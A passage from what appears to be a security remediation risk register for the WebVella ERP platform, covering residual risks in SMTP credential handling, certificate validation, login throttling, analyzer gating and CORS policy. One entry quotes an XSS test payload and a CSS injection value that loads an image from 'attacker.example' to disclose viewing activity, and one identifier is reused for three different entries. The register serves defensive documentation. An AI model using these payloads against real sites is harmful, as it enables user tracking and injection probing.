six commands and nothing else attributable to the migration.

**A correction worth recording.** An earlier working note placed these statements at `ERPService.cs`
lines 69 and 71. That is where they are *called*; a search of `ERPService.cs` for `CREATE CAST`,
`DROP CAST` or `CREATE EXTENSION` returns **zero** matches, and `DbRepository.cs` is the only tracked
C# file in the repository that contains any of them. Anyone re-verifying this should look at
`DbRepository.cs`.

**Why not fixed.** These four cast definitions and two extensions are how the platform makes its own
data access work at all; the implicit `varchar`-to-`uuid` cast in particular is depended upon
throughout the query layer. Removing or conditioning them is a platform change with no security
motivation. They are also idempotent by construction — `DROP ... IF EXISTS` followed by `CREATE`, and
`CREATE EXTENSION IF NOT EXISTS` — so re-running provisioning does not accumulate state.

**Recommended fix.** None is warranted on security grounds. If a future deployment must run under a
least-privilege database role, these six statements are the reason provisioning currently requires
elevated rights, and the remedy is to perform them once as a documented install-time step so the
application role no longer needs them.

#### RISK-034 — Plugin patches seed page-component options containing server-authored code

| Field | Value |
| --- | --- |
| **Status** | Accepted — by-design intentional-HTML channel, with a compensating control. |
| **Related finding** | The stored cross-site-scripting class, and `RISK-023`, which records the four by-design raw-output channels this one resolves through. |
| **Location** | `WebVella.Erp.Plugins.Project/ProjectPlugin.20190203.cs` — seventeen `PcFieldHtml` page-component seeds, of which **thirteen** carry a code-typed value. The first is declared at line 2441 with its value literal at line 2446. |

The Project plugin's patch files seed page components of type
`WebVella.Erp.Web.Components.PcFieldHtml`, and thirteen of the seventeen seeds in this file carry an
`options.value` whose inner `string` member is **C# source** — each begins `using System;` — rather
than a literal HTML fragment. The remaining four carry short plain values. The same component is seeded
from five other patch files as well: three seeds in the Mail plugin and one each in three further
Project patches.

**What this is, stated precisely.** The seeded value is server-authored code that the platform
evaluates to produce a field value, whose result is then rendered as HTML. It is **not** attacker-
controlled and **not** a reflected or stored injection of user input: the content originates in the
repository's own patch source, is applied at provisioning, and is only mutable afterwards by a user
holding permission to edit stored page-component options.

**Two facts that bound this, both measured rather than assumed.** First, the component's own Razor views
contain **zero** occurrences of the raw-output helper — the earlier working note that framed this as "a
seeded unencoded markup snippet" was imprecise on both counts. `Display.cshtml` passes the value to a
`<wv-field-html>` tag helper, and second, that tag helper is **not repository source**: a search for
its implementing type across every tracked C# file returns nothing, because it ships inside the
`WebVella.TagHelpers` package pinned at version 1.8.0. Third-party and vendored code is restricted to
version updates under this engagement's modification boundaries, so the rendering behaviour is not
ours to change.

**Why not fixed.** Three independent reasons, any one of which would be sufficient. The component is an
intentional-HTML channel, and this class of channel is remediated by compensating control — restricting
authoring of markup and script to privileged roles, plus the Content-Security-Policy — rather than by
encoding, because encoding it would disable the feature it implements. The rendering code is vendored.
And correcting already-seeded values in a deployed installation would require a data migration over
stored page-component options, which is neither a confirmed Critical nor High finding and is exactly
the change the minimal-change constraint forbids.

**Recommended fix, for a future sprint.** Treat permission to edit page-component options as equivalent
to permission to author server-side code, and audit which roles hold it — that, not encoding, is the
real control here. If the seeded snippets are ever to be constrained, do it by narrowing what the
`PcFieldHtml` value may contain at the point it is saved, and pair that with a migration that rewrites
the thirteen existing seeds, so stored data and validation rules cannot disagree.

#### RISK-035 — The taint-dataflow analyzer family runs, but intraprocedurally only

| Field | Value |
| --- | --- |
| **Status** | Accepted — measured cost tuning, not a capability gap. |
| **Related control** | Gate 1, static analysis. |
| **Scope** | `CA3001`–`CA3012`, the taint-dataflow rule family. |

Given an identifier here so the exclusion is findable from the index rather than reachable only through
the prose that first recorded it. The full treatment, including the probe that proved the rules
function and the measurements that ruled them out, is in the analyzer discussion earlier in this
register and in the [secure configuration guide](secure-configuration.md); it is deliberately not
restated here, so the two cannot drift apart.

In summary: a probe confirmed `CA3001` correctly detects a deliberate SQL-injection flow, so the family
works. Enabling it repository-wide **at its default interprocedural depth** took the solution build from
**102 seconds to more than 6,600 seconds without completing**, with the Roslyn compiler server failing
outright.

**This entry's disposition has changed twice, and both changes are recorded rather than overwritten.**
The original wording concluded from that measurement that the family had to be excluded altogether. An
intermediate revision replaced it: the family *was* enabled by `AnalysisLevelSecurity=latest-all` with its
cost bounded by a per-rule `dotnet_code_quality.CA30xx.interprocedural_analysis_kind = None` option in a
repository-root `.globalconfig`, restricting each of the twelve rules to intraprocedural tracking — an
*option*, not a suppression, and a probe confirmed `CA3001`, `CA3003` and `CA3012` fired identically with
and without the tuning.

**The original wording is now correct again.** AAP 0.6.1 Class 2 freezes the analyzer gate at
`EnableNETAnalyzers` plus `AnalysisLevel=latest-recommended`, so both the level upgrade and the
`.globalconfig` were withdrawn, and the family is excluded altogether once more. The two could not be
separated: the `dotnet_code_quality.*` options have no MSBuild equivalent, so keeping the level without
the file took a single-project build from 109 s to a timeout at 600 s.

The residual is therefore an exclusion rather than a depth limit, and it is wider than the intermediate
revision's: taint-propagated sinks rest on manual review **whether the flow crosses a method boundary or
not**. Nothing is *suppressed* — the rules produce no diagnostic because they do not execute, which is a
different thing from a diagnostic being hidden — but the practical consequence is the same, and it is why
the manual review record for these sinks is the only coverage they have. Revisit if the frozen gate is ever
widened *and* the analyzer's dataflow performance improves; both conditions are required.

#### RISK-108 — A Project widget accepts a stored CSS colour verbatim inside a `style` attribute

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — documented control only. |
| **Related finding** | Adjacent to `H-06` (CWE-79) but **not** an instance of it. The residual weakness is CSS injection and the information disclosure it enables (CWE-1236-adjacent, OWASP A05:2021 Security Misconfiguration). |

Discovered during the hostile-payload verification of the stored cross-site-scripting remediation, not
reported by any finding. `WebVella.Erp.Plugins.Project/Components/PcProjectWidgetTasksPriorityChart/Display.cshtml`
renders the priority legend as `<i class="@option.IconClass" style="color: @option.Color">` at three
lines, one per priority level. Both values come from the `priority` select field's stored options, which
an administrator can edit.

**What is not wrong, stated first, because the distinction is the whole point.** These are ordinary
Razor expressions, so both values are HTML-encoded. A quote in either value arrives as `&quot;`, the
attribute cannot be closed, no second attribute can be introduced, and no event handler can be
injected. This was verified rather than reasoned about: with a payload of
`fas fa-fw fa-arrow-circle-up" onmouseover="…` seeded in the icon class and a matching payload in the
colour, the rendered element carried exactly its two intended attributes, its `on*` attribute set was
empty, and the injected script never ran. It is **not** a raw-output sink, it uses no `Html.Raw`, and it
is correctly not one of the nine reviewed findings.

**What is residual.** Because the value lands inside a `style` attribute, a hostile colour such as
`red;background-image:url(https://attacker.example/p.png)` is accepted by the CSS parser as two valid
declarations, and the browser then fetches that image. That is an outbound request to an
attacker-controlled origin carrying a `Referer`, so it discloses that a particular user viewed a
particular screen. A hostile *class* value is similarly accepted as extra class tokens, which can
restyle the element. Neither executes script. The exposure is therefore **Medium**-class information
disclosure and restyling, which under the governing constraint is documented rather than fixed.

**Attribution is explicit.** The file appears in **no** commit of this remediation, `git diff` against
the checkpoint base returns nothing for it, there are no uncommitted changes to it, and the three lines
are present verbatim in the upstream original. It predates this work entirely. It also lies outside the
plan's enumerated view list for the output-encoding class, which names six Project widget views and not
this seventh one.

It is worth recording that this component served as the **built-in positive control** for the widget
verification: during hostile-payload testing it produced the only request to the attacker origin in the
entire session, while every widget under remediation produced none. A negative result measured against a
control that fires is worth considerably more than one measured against nothing.

**Recommended fix, for a change permitted to touch this file:** constrain the colour to a strict CSS
colour grammar and the class to a character allow-list, discarding the whole value on any violation and
falling back to the inherited style — which is exactly the control the tasks-queue widget already
applies through its `SafeCssColor` and `SafeIconClass` helpers, so the implementation can be reused
verbatim rather than designed. Until then the Content-Security-Policy is the compensating control: once
enforced, `default-src 'self'` blocks the cross-origin image load, and it is already **reported** today.

#### RISK-111 — Three anonymous routes share one per-address failure budget

| Field | Value |
| --- | --- |
| **Status** | Accepted — intended behaviour. Recorded because the co-tenancy is a real interaction, not because it is a defect. |
| **Related finding** | `H-16` (CWE-307, no account lockout and no rate limiting) and the token-route hardening that accompanies it. |

Three anonymous surfaces consume the **same** per-address failure budget — 25 failures in a rolling
15-minute window, five times the 5-failure per-account limit:

* the login page, `WebVella.Erp.Web/Pages/login.cshtml.cs`;
* the token-issue route, `WebApiController.GetJwtToken`;
* the token-refresh route, `WebApiController.GetNewJwtToken`.

**Why the budget is shared rather than per-route.** A per-route budget would let one source spend a
full allowance on each surface in turn, tripling the failures it can produce before anything refuses
it. Sharing one budget bounds the total unauthenticated failure rate from a single source *however the
source distributes it*, which is the property the control is actually for.

**Why the refresh route is bounded by address alone, with no account dimension.** No account is named
on that route — a token is, and an unverified token names nobody trustworthy. There is no principal to
lock, and inferring one from an unverified token would be worse than useless: a forged token would then
lock out whichever account it claimed. The route is nonetheless throttled because it is
`[AllowAnonymous]` and validates an attacker-supplied token, which makes it a signature-guessing
oracle — each attempt reveals whether a candidate token verified. Throttling only the two password
surfaces would have left forgery attempts unbounded.

**The interaction, stated plainly.** A source that has already exhausted its budget on failed logins
will find token issue and token refresh refused as well. For a single hostile source that is the
correct outcome and the intended one. The case worth naming is co-tenancy: legitimate clients sharing
one egress address with an attacker — behind a corporate NAT, a proxy or a CGNAT pool — can be refused
for failures they did not cause. That is inherent to any address-keyed control and is the same
trade-off `RISK-008` records for the per-process scope of the throttle store.

**Bounds that keep the impact proportionate.** The window is 15 minutes and expires on its own, with no
administrative unlock required. A **successful** login clears the account counter. Refusal is
`429`-shaped throttling, never a durable account lock, so no attacker can convert address pressure into
a persistent denial of service against a named user. Refusal audits are coalesced rather than written
per request, so the refusals cannot themselves flood the audit trail (`CWE-779`).

**Recommended fix, for a change permitted to add infrastructure:** key the budget on a
distributed store together with `RISK-008`, and partition it by a forwarded client address where a
trusted reverse proxy supplies one, so that a shared egress address stops being a shared fate.

### Documented-only findings

Every Medium and Low finding not remediated is documented with recommended fix guidance in
[the security audit report](security-audit-report.md), in the mandated eight-field format. They are
documented rather than fixed because the governing constraint is to remediate confirmed Critical and
High severity findings, remediate a Medium only where it is a compensating control for one of those,
and document the remainder. Adding controls for weakness classes with no confirmed finding would be
the enhancement-beyond-remediation that the constraints forbid.

### Ongoing recommendations

Recognised as valuable, all outside this remediation's scope, none started:

* **Make a non-published Production run behave like a published one.** Have the host builders call
  `UseStaticWebAssets()`, or standardise verification on `dotnet publish` output, so that no operator
  is ever tempted to restore styling by setting `ASPNETCORE_ENVIRONMENT=Development` and silently
  undoing the `H-12` and `H-15` remediations (`RISK-031`).
* **Add `autocomplete` attributes to the login form's e-mail and password inputs.** Chrome raises an
  informational advisory on `/login` for their absence. It is neither a console error nor a warning and
  carries no confirmed security finding, so it is noted for completeness only, as HTML hygiene rather
  than remediation.

* **A test suite.** No automated test project, test-framework package reference or executable test
  method exists in any of the 19 projects, which made the "existing test suite passes" validation
  gate vacuous by construction. (Stated that way deliberately: the looser "no test file" is both
  unfalsifiable and wrong in spirit, because a file may be named for testing without being a
  runnable test.) The substitute verification regime is recorded in the
  [remediation log](remediation-log.md). Creating a suite is feature work the constraints exclude,
  and it is the single highest-value investment available here.
* A distributed store for login throttling (RISK-008).
* A **persisted** revocable refresh-token table with rotation and reuse detection. Signing out already
  invalidates an already-issued bearer token as well as the cookie session (`RISK-007` is closed), so
  what this would add is durability rather than the control itself: a persisted list would survive a
  restart and span instances, which the in-process store does not (`RISK-036`).
* Completing the Content-Security-Policy rollout to enforcing mode (RISK-022). The switch itself is
  now a configuration key rather than a code change, so what remains is the engineering work the blocker
  inventory names: eliminating or hashing the inline style and script, and adding the `img-src` and
  `worker-src` directives the mandated policy omits.
* A shared, durable store for the report collector's per-source acceptance counters, on the same
  reasoning as `RISK-036` and `RISK-008`: the current table is per process, so a multi-instance
  deployment enforces the bound once per instance rather than once overall (RISK-005).
* A `Directory.Build.targets` re-appending the promoted audit codes after every project body, so the
  dependency gate cannot be discarded by a single careless `.csproj` assignment (RISK-029).
* Enrolling both WebAssembly projects in the solution, so that one solution-level command covers all 19
    (`RISK-030`). This is **not** agent work and has now been attempted and reverted twice: the frozen
    plan authorises exactly one change to `WebVella.ERP3.sln`, the project-reference path casing repair,
    so changing solution membership is scope drift in a build-integrity file — which is what review
    finding `CR2-F-06` records. Until an owner widens that authorisation, the two projects stay covered by
    dedicated restore, build and advisory steps, which are worth keeping regardless because they assert
    each resolved `TargetFramework` explicitly, something a successful solution build cannot rule out.
* Partitioning the per-address failure budget by a proxy-supplied client address, so a shared egress
  address stops being a shared fate for co-tenant clients (RISK-111, with RISK-008).
* A `must_change_password` marker on the user entity, so the generated initial administrator password
  is *forced* to be rotated rather than merely advised (RISK-027).
* Reviewing the per-host CORS allow-lists themselves. Replacing the two permissive policies is **done**
  (`RISK-013`), and both `WebVella.Erp.Site` and `WebVella.Erp.Site.Project` now read their lists from
  `Settings:Cors:AllowedOrigins`, so they are deployment configuration and deny every origin when
  unconfigured outside `Development`. The remaining **five** hosts still name a hard-coded set of
  `http://localhost` development origins in source. Those need to become deployment configuration before
  any of the five faces a real front end.
* Integration with a dedicated secret manager, rather than environment variables alone.
* Centralised log aggregation, intrusion detection, and a web application firewall.
* Automated dependency-update tooling, so advisories surface without a manual review.
* Independent penetration testing. Nothing in this remediation substitutes for it.
* Multi-factor authentication, and password expiry and history policies — no confirmed Critical or
  High finding required them, so they are recommendations rather than remediation.
* **Container definitions and orchestration manifests.** The repository contains no `Dockerfile`, no
  compose file and no orchestration manifest, so there is no deployment artefact to harden and none was
  added — infrastructure outside the application boundary is out of scope by instruction. When they are
  written, the [secure configuration guide](secure-configuration.md) is the input: the three required
  secrets, the transport requirements and the environment posture are what a manifest has to carry.
* **Central package management with a committed lock file** (`Directory.Packages.props` plus
  `packages.lock.json`), together with an explicit `nuget.config` package source, so that restore is
  byte-deterministic and the dependency gate cannot be reached from an unexpected feed. All three files
  are deliberately absent today, as `L-07` records.

## Detailed entries — residuals introduced by the continuous security gate

The three entries below are limits of the gate itself rather than of the application. They are recorded
because a gate that does not publish its own blind spots invites a green run to be read as a stronger
statement than it is.

#### RISK-035 — SUPERSEDED by RISK-051: security taint analysis does not run

| Field | Value |
| --- | --- |
| **Status** | Superseded. The residual described here — interprocedural-only blindness — has been replaced by a wider one: the family does not execute at all. The canonical entry is the restated `RISK-051`. |
| **Related finding** | `CI-03` (the SAST gate did not exercise the security rule families). |

**What this entry described.** `AnalysisLevelSecurity=latest-all` turned on the dataflow rules
`CA3001`–`CA3012`, which trace untrusted input to a sink. By default they follow flows **across** method
boundaries, and on this codebase that did not complete: the whole-solution build was allowed 1,800 s and
then 2,400 s and exceeded both. A repository-root `.globalconfig` therefore set
`dotnet_code_quality.CAxxxx.interprocedural_analysis_kind = None` for those twelve rules, bringing the
build to 370–415 s. The residual was that a tainted value entering one method and reaching a sink in
another was not reported, while a flow contained within a single method still was.

**Why it no longer describes the tree.** AAP 0.6.1 Class 2 freezes the analyzer gate at
`EnableNETAnalyzers` plus `AnalysisLevel=latest-recommended`. Both the `AnalysisLevelSecurity` upgrade and
the `.globalconfig` are additions beyond that shape and were withdrawn, and they could not be separated —
the `dotnet_code_quality.*` options have no MSBuild equivalent, so removing the file while keeping the
level took a single-project build from 109 s to a timeout at 600 s.

**The residual as it now stands is strictly wider:** taint-propagated sinks are outside the gate whether
or not the flow crosses a method boundary. Two of the three bounds this entry claimed no longer hold, and
saying so is the point of keeping the entry. The tuning-is-an-option argument is moot, because there is no
tuning and no enabled rule to tune. The uniform-tuning argument is moot for the same reason. What does
survive is that nothing is **suppressed**: these rules emit nothing because they do not execute, which is
materially different from a produced diagnostic being hidden, and it is why no suppression appears anywhere
in the tree. The gate's positive control has been re-armed accordingly — it now asserts that `CA5350`,
`CA5359` and `CA5364` **are** reported against deliberate defects and that `CA5390` and `CA2100` are
**not**, so CI proves both which rules are live and which are absent rather than assuming either.

**Recommended fix:** run an unconstrained interprocedural analysis out of band — nightly, or on a
release branch — where a multi-hour build is acceptable, and reconcile its findings against the Gate 1
allow-list.

#### RISK-109 — No scheduled re-audit; advisories are detected on the next push

| Field | Value |
| --- | --- |
| **Status** | Accepted — the trigger set is a configuration contract, and the capability is preserved manually. |
| **Related finding** | `CI-02` (the workflow triggered outside its permitted set). |

The workflow runs on push to `master`, on pull requests targeting `master`, and on manual dispatch. It
does **not** run on a schedule.

**The residual:** the normal way a dependency becomes vulnerable is that an advisory is published
against a package nobody has touched (A06:2021, Vulnerable and Outdated Components). Between pushes,
this repository would not learn of such an advisory. A weekly cron had been added for exactly that
reason and was removed, because the trigger set is fixed by contract and a scheduled trigger is not in
it.

The concern is real and is not dismissed. `workflow_dispatch` preserves precisely the same capability —
a maintainer re-audits an unchanged tree against a changed advisory database on demand — so what is lost
is the *timer*, not the *ability*. Because the audit codes are promoted to build errors and the audit is
configured to reach transitive dependencies at the lowest severity, the next push after an advisory is
published fails immediately rather than merely reporting.

**Recommended fix, for a change permitted to alter the trigger set:** reinstate a scheduled run, or
subscribe the repository to advisory notifications so a maintainer knows when to dispatch one.

#### RISK-110 — The secret sweep covers the tracked tree, not git history

| Field | Value |
| --- | --- |
| **Status** | Accepted — a scope boundary, with a mandatory operational consequence. |
| **Related finding** | `CI-04` (the secrets gate read only four files) and `RISK-026` (secrets already published in history). |

Gate 3 enumerates `git ls-files` and sweeps every tracked **text** file — 1,518 of them, with no path
exclusions; binary content is skipped by content inspection rather than by a path list. It proves itself
against a synthetic credential planted for every rule in ten file formats before its verdict is
believed.

Two limits remain.

**Git history is not swept.** A credential that was committed and later removed still exists in the
object database and is still retrievable from any clone. The consequence is operational and
non-negotiable: such a credential must be **rotated**, not deleted. This is the same residual
`RISK-026` records for the secrets already published by this repository.

**A credential with no shape and no name is not detectable.** The tiers key on a recognisable
signature, on a secret-named key, or on length-plus-entropy. A short, low-entropy value assigned to a
neutrally named symbol satisfies none of them. That is an inherent property of pattern-based secret
detection rather than a defect in this implementation, and it is why the sweep is a regression guard for
the Class 5 scrub rather than a proof that no credential exists anywhere.

**Recommended fix:** add a history-scanning pass (`git log -p` piped through the same engine, or a
dedicated tool) as an out-of-band audit, and rotate every credential the repository has ever published.
* **Encryption at rest for the SMTP service credential**, together with the sentinel protocol and the
  presentation change that a reversible secret needs before an administrator edit form can round-trip it
  safely (`RISK-032`). Doing it properly also needs an authenticated-encryption primitive, which the platform
  does not yet have — its only symmetric helper carries the deterministic-initialisation-vector weakness of
  `RISK-006`.
* **Extend the SMTP authorisation review to the `email` entity**, which grants the Regular role create, read,
  update and delete on stored message bodies (`RISK-035`). No credential is stored there, which is why it is
  outside the confirmed finding, but it is the natural next target.


## Detailed entries — SMTP transport security and the SMTP service credential

These four entries record the decisions taken while closing the mail plugin's two High-severity
findings: the production certificate-validation bypass, and the `smtp_service` credential's
readability by the Regular role. The controls themselves are described in the
[remediation log](remediation-log.md) and the operator-facing configuration in the
[secure configuration guide](secure-configuration.md).

### RISK-032 — The SMTP service credential is not encrypted at rest

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — a reasoned decline, not an oversight. Five of the finding's six sub-requirements are implemented. |
| **Related finding** | SMTP credential exposure (CWE-200 information exposure, CWE-522 insufficiently protected credentials, CWE-732 incorrect permission assignment) |
| **Owner** | Repository owner. Reversing this decision is a product decision, not a defect fix. |

The finding required six things: Administrator-only CRUD, Administrator-only access to the secret
field, removal of the secret from generic projections and JSON, **encryption at rest with external key
material**, a minimised plaintext cache lifetime, and a migration for existing records and
permissions. Five are implemented and verified. Encryption at rest is declined, for four reasons
that are recorded here in full because the decision must be auditable rather than assumed.

**1. It does not mitigate the stated exploit.** The exploit in the finding is a Regular user reading
the credential *through the application* — `SELECT id, name, server, username, password FROM
smtp_service` — and then pointing the server at an attacker-controlled host with a valid
certificate. An application that stores the value encrypted decrypts it for exactly that read,
because the send path needs the plaintext. Encryption at rest defends against a stolen database file
or a backup, which is a different threat from the one confirmed. The control that closes the
confirmed exploit is the authorisation narrowing, and that is now proven closed at three independent
layers: the stored entity metadata, the core record and EQL paths, and a live HTTP request.

**2. The only symmetric primitive available carries a known, deliberately unfixed weakness.**
`WebVella.Erp/Utilities/CryptoUtility.cs` derives a deterministic initialisation vector, recorded as
`RISK-006` and accepted precisely because it is *latent* — it has no active caller. Adopting it here
would convert a documented latent defect into an active one, and would do so on a credential. That
is a worse security posture than the one being replaced, not a better one.

**3. A new cryptographic dependency is outside the change boundary.** The governing constraints admit
no new package references; every control in this remediation resolves from framework references
already present. Introducing an authenticated-encryption library, or hand-rolling one, is precisely
the enhancement-beyond-remediation the constraints forbid.

**4. Decisively — the administrator edit form round-trips this field.** This is the reason that turns
a judgement call into a clear one. The SMTP service details page renders the credential as an
inline-edit control that posts the field back through the generic record-update route; that was
verified against a running host, where the field renders with the platform's inline-edit affordance
for an administrator. If the stored value were ciphertext, the form would display ciphertext and save
it again, double-encrypting the credential and silently breaking **all** mail delivery, including the
error-notification path that would report the breakage. Preventing that needs a sentinel protocol on
the write path plus a presentation change to decrypt for display — the same wide ripple class the
change constraints exclude, on the same field whose exposure is already closed by authorisation.

**What is in force instead.** Administrator-only CRUD on the entity; `EnableSecurity` with
Administrator-only read and update on the field; `[JsonIgnore]` on the model property so the secret
cannot leave through a generic JSON projection; a plaintext cache bounded to five minutes with a
one-minute expiration scan; and a dated plugin patch that migrates existing installations. The
residual is explicit: an operator with direct database access, a database backup, or a filesystem
copy still reads the credential in plaintext. Anyone who accepts that residual should also read
`RISK-034`, because a custom-role delegation can widen it.

### RISK-033 — The SMTP certificate-validation opt-out survives in Development posture

| Field | Value |
| --- | --- |
| **Status** | Accepted — the residual is the Development posture itself, and it is deliberate. |
| **Related finding** | H-11 (CWE-295 improper certificate validation, OWASP A02:2021) |
| **Owner** | Platform team |

`SmtpService.AllowInvalidRemoteCertificates` yields `true` only when
`Settings:EmailSMTPAllowInvalidCertificates` parses as `true` **and** `ErpSettings.DevelopmentMode`
is set. Outside Development posture the setting is refused, certificates are validated, and the
refusal is reported once per process. Because that single member gates all five callback sites, there
is no site at which the bypass is reachable in production. Three properties of that design are
residual risks worth stating rather than leaving implicit.

* **A Development installation still accepts any certificate.** That is the feature: a self-signed
  development mail server must stay usable, and removing the capability entirely would break a
  legitimate workflow rather than close a vulnerability. An operator who sets *both* settings is
  choosing the risk explicitly, and is told so.
* **The refusal notice is emitted once per process, not once per connection.** It is a statement about
  configuration, not an event, so repeating it per message would be noise — but it also means a log
  pipeline attached *after* start-up will not see it. The authoritative check is the configuration
  itself, not the log.
* **The notice is written to standard error rather than through the platform log, deliberately.** A
  platform log record can raise an e-mail notification, and the subsystem being reported on is the
  mailer. Logging through it here would route a warning about mail transport configuration into the
  very transport whose configuration has just been refused.

`ErpSettings.DevelopmentMode` defaults to `false`, so the policy fails closed even before
configuration has been initialised — a mail send attempted during start-up cannot obtain the bypass
by racing the configuration load.

### RISK-060 — An operator may disable SMTP certificate revocation checking, in any posture

| Field | Value |
| --- | --- |
| **Status** | Accepted, conditionally — the preferred fix is to publish the revocation source; disabling the check is the supported fallback and must be recorded by the deployment that uses it. |
| **Related finding** | H-11 follow-up (CWE-299 improper check for certificate revocation, CWE-295, OWASP A02:2021) |
| **Owner** | Deployment owner |

**What this is a residual of.** Closing H-11 removed an always-true certificate callback, which had
been masking every chain error including revocation ones. MailKit checks revocation by default, so the
moment real validation applied, a relay whose certificate is *entirely valid* — correct host name, in
date, issued by a CA the host trusts — but whose chain names no fetchable CRL distribution point
became unreachable. Measured, not theorised: two relays differing **only** in revocation reachability
behave differently, and the failing one reports a chain status of nothing but `unable to get
certificate CRL`. Real deployments in that position are ordinary rather than exotic — an internal CA
that publishes no CRL, a leaf issued without a `crlDistributionPoints` extension, or a host whose
egress filtering blocks the fetch.

**Why the residual exists at all.** Every available answer carried a cost, and the one chosen carries
the smallest:

* *Leave revocation unconditional.* Rejected. It denies service to valid relays with **no** supported
  remedy, because the only pre-existing escape hatch accepts any certificate and is refused outside
  Development. That combination is the defect the follow-up exists to remove.
* *Widen the accept-any opt-out into production.* Rejected outright. It hands back precisely the
  behaviour H-11 removed, for the sake of a missing CRL.
* *Add a second, narrower switch.* Chosen. `Settings:EmailSMTPCheckCertificateRevocation=false`
  disables one check and leaves the trust chain, the validity dates, the key usage and the host name
  all enforced.

**What is actually given up, stated precisely.** One thing: a relay certificate whose private key has
leaked and whose issuer has since revoked it will no longer be refused. Everything else still refuses
— a self-signed certificate, an expired one, one naming the wrong host, one from a CA the host does not
trust. That was verified in both modes rather than reasoned about: with revocation disabled, a
self-signed relay still fails `UntrustedRoot` and a wrong-name relay still fails on the host name.

**Why it has no posture gate, unlike `RISK-033`.** A control that is inert in production is no remedy
for a production outage — that is the whole substance of the finding this closes. The two relaxations
are not comparable in width, and the register should not pretend they are: accepting any certificate
removes transport authentication entirely, whereas skipping a revocation lookup removes one check of
several. The first is a development convenience and is correctly refused in production; the second is
an operational accommodation for a real and lawful PKI topology, and is correctly honoured there.

**What bounds the residual.**

* **Secure by default, with the default inverted relative to its neighbour.** Only a value that parses
  as boolean `false` disables the check. Absent, blank, `true`, and unparseable values such as `no`,
  `0` and `off` all leave revocation enabled, as does a settings layer that has not yet been
  initialised. An operator cannot arrive here by typo — only by decision.
* **It is announced.** One notice per process on standard error, naming the setting key and nothing
  else, so the weakened posture is on the record rather than inferable only from configuration nobody
  re-reads. As with `RISK-033`, it is a statement about configuration rather than an event, so a log
  pipeline attached after start-up will not see it; the configuration is the authoritative check.
* **It governs all five send sites from one member**, so no path can drift into a different revocation
  posture from the others.
* **Revocation checking genuinely works when left on**, which is what makes turning it off a real if
  bounded loss rather than a formality: a leaf revoked in its issuer's CRL is refused with a distinct
  `certificate revoked` chain bullet, while a non-revoked leaf validated against that same freshly
  published CRL still delivers.

**How to retire it.** Re-issue the relay leaf with a `crlDistributionPoints` extension pointing at a
CRL the application hosts can fetch, sign that CRL with a CA carrying `cRLSign` and a subject key
identifier, publish it in DER form, then remove the setting and confirm a test send still delivers.
The [secure configuration guide](secure-configuration.md) carries the step-by-step form of this.

**Not covered by this entry.** Granular revocation behaviour — soft-fail, offline-only, or a per-service
override — is not offered. MailKit exposes a single boolean, and inventing a richer policy on top of it
would exceed the least-invasive-control constraint that governs this remediation.

### RISK-034 — The permission migration preserves operator-created delegations

> **Compare `RISK-050`.** The schema version **4** migration for the `user` and `role` entities takes the
> *opposite* decision on the same question, and deliberately so: it removes the **Guest** role
> unconditionally rather than preserving an operator delegation. The distinction is the grantee. A
> delegation to a named human role is a legitimate operational choice; a grant to the role an
> **unauthenticated** caller is evaluated against is what the mandated deny-by-default clause
> prohibits outright, so there is no delegation worth preserving.

| Field | Value |
| --- | --- |
| **Status** | Accepted — a deliberate scope choice, with a residual an operator must review. |
| **Related finding** | SMTP credential exposure (CWE-732) |
| **Owner** | Repository owner, for the review of existing delegations. |

The migration removes the Regular and Guest role identifiers from each of the four
`smtp_service` permission lists rather than replacing those lists with an Administrator-only set.
The distinction is deliberate: replacing them would silently revoke any delegation an operator had
created on a custom role, which is the operator's own decision and not this remediation's to
override. The behaviour is verified — with a custom operator role added to all four verbs alongside
Regular and Guest, running the migration revoked Regular and Guest on every verb and left both
Administrator and the custom role intact.

The residual follows directly: an installation that had delegated `smtp_service` read or write access
to a broad custom role still exposes the credential to every member of that role after the migration.
Reviewing those delegations is an operator action, and the
[credential migration guide](credential-migration.md) and
[secure configuration guide](secure-configuration.md) are where an operator is told to do it. The
seed provisioning for a *new* installation grants Administrator only, so this residual exists solely
for installations that were customised.

### RISK-035 — Residual observations recorded while closing the SMTP credential work

| Field | Value |
| --- | --- |
| **Status** | Named, not fixed — none is within the confirmed finding, and each is recorded so it is not rediscovered as new. |
| **Owner** | Platform team |

* **The `email` entity grants the Regular role all four verbs.** Confirmed against a provisioned
  database: the mail plugin's `email` entity permits create, read, update and delete to the Regular
  role. The confirmed finding names `smtp_service` only, and stored message bodies are not
  credentials, so widening the change here would be scope creep — but it is the natural next review
  target and is carried into the ongoing recommendations above.
* **Sitemap node access lists in the mail plugin are inert.** A dated patch updates area and node
  records with empty access-role lists, and one node carries an unrelated external URL. Neither has
  any effect: page authorisation is enforced at **application** level, by intersecting the
  application's access list with the current user's roles, and node access lists are not consulted on
  that path; the URL is ignored for entity-type nodes. This is data hygiene rather than exposure, and
  it is recorded so that a future reader does not mistake an empty node list either for a
  vulnerability or for a control.
* **The EQL entity read-permission check is row-driven.** The check runs while converting each
  returned row, so a query that matches no rows never reaches it. Nothing can leak through that path
  — there is no row to leak — but it means an empty result set is **not** evidence that
  authorisation was enforced. Any verification of that control must therefore assert against a
  populated table, and the verification for this work does.
* **`ProcessPatches()` carries a stack-trace-destroying rethrow idiom.** Seven pre-existing inner
  handlers assign the caught exception to an unused local and then rethrow it by name, which resets
  the stack trace and is what the analyzer reports as `CA2200` on that file. They are left untouched
  under the minimal-change constraint. The dated patch added by this work deliberately omits an inner
  handler altogether, so it neither replicates the idiom nor alters the existing ones — a patch
  failure propagates with its original stack trace intact.

## Detailed entries — session revocation, bearer token validation and cross-origin policy

These entries record the closures and the one new residual produced while remediating review findings
`F7`, `F8`, `F11` and `F19`. Two previously open items in this register are closed here; one new risk is
opened, because the control that closes the larger one is deliberately in-process.

### RISK-013 — Closed: no permissive cross-origin policy remains

| Field | Value |
| --- | --- |
| **Status** | **Closed.** |
| **Related finding** | H-14 (CWE-942 permissive cross-domain policy, OWASP A05:2021); review finding `F19` |
| **Owner** | Platform team |

Both hosts that served an any-origin policy now serve an explicit allow-list:
`WebVella.Erp.Site/Startup.cs:L132-L138` and `WebVella.Erp.Site.Project/Startup.cs:L159-L184`. The other
five hosts already used a restrictive named policy and were deliberately left alone, which is why this
finding was scoped to two hosts rather than seven — overstating its breadth was one of the
false-positive classes the audit eliminated.

Both lists now read `Settings:Cors:AllowedOrigins`, so either deployment can be configured without a
rebuild and an unconfigured non-development deployment denies every origin. Their only difference is
the fallback used when the key is absent *and* `ASPNETCORE_ENVIRONMENT` is `Development`:
